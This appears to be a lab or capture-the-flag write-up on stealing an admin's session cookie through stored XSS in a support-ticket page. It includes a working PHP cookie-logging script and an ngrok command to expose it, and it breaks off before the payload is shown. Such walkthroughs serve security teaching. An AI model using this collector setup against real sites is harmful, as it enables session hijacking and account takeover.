We are giving a website with 2 users

**_A normal user page :_**


![](https://i.imgur.com/SeBIL1f.png)



**_An admin page_**



![](https://i.imgur.com/xcjIfUR.png)


**The task here is to steal the Admin cookie via stored xss, so we can automatically be logged in as admin**

## **Understanding the flow**


- Starting with a basic XSS payload i wanted to understand the flow of this application, so i sent our payload to the **Admin** via the support ticket page of the normal user

![](https://i.imgur.com/THMNNRs.png)

- Navigating to the admin page and refreshing it, we truly have stored XSS

![](https://i.imgur.com/0mXRLZ1.png)



## **Preparing our Exploit**


- First of all since we will be using **Ngrok** as our server, we need to create a Script that will take the logs of our admin and save it to a `.txt` file every time he tries to login or refresh his browser made by [@Ravid11345277](https://twitter.com/Ravid11345277). As seen below we can save this PHP code in our file system with the extension `.php`

```PHP
<?php

$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
$ua=$_SERVER['HTTP_USER_AGENT'];


$fp=fopen('cookies.txt' , 'a+');

fwrite($fp, $ip.' '.$ua."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);

?>
```



- Now start up your **Ngrok** server with the following command, where the `PHP` file was saved

```bash
$ ngrok http 80
```



![](https://i.imgur.com/PNGlTEU.png)


- Navigating to the normal user page we can craft the XSS payload